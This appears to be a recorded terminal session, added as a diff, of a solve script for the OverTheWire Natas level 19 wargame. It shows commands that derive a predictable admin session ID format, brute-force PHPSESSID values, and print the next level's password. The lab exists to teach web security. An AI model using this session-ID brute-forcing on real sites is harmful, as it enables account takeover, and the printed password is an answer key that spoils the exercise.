@@ -1,0 +1,6 @@
+{"version":3,"term":{"cols":100,"rows":32},"timestamp":1793506751,"idle_time_limit":2.0,"command":"bash /home/claude/solves/natas/L19.sh","title":"Natas L19 -> natas20: brute-force hex(<n>-admin) session id","env":{"SHELL":"/bin/bash"}}
+[0.002, "o", "$ curl -s -u natas19:<pw> http://natas19.natas.labs.overthewire.org/index-source.html\r\n$   createID: $idstr = \"$idnum-$user\"; return bin2hex($idstr);  maxid=640\r\n$   so the admin session id is hex(\"<n>-admin\") for n in 1..640\r\n"]
+[0.615, "o", "$ brute-force hex(\"<n>-admin\") as PHPSESSID\r\n"]
+[107.028, "o", "FOUND n 281 sid 3238312d61646d696e\r\n<pre>Username: natas20\r\nPassword: slOKYGsjlJhaqKliGvrgWAzln0JyrWao</pre>\r\n"]
+[0.007, "o", "$ verify: curl -u natas20:<pw> http://natas20.natas.labs.overthewire.org/ -> 200\r\n"]
+[0.000, "x", "0"]
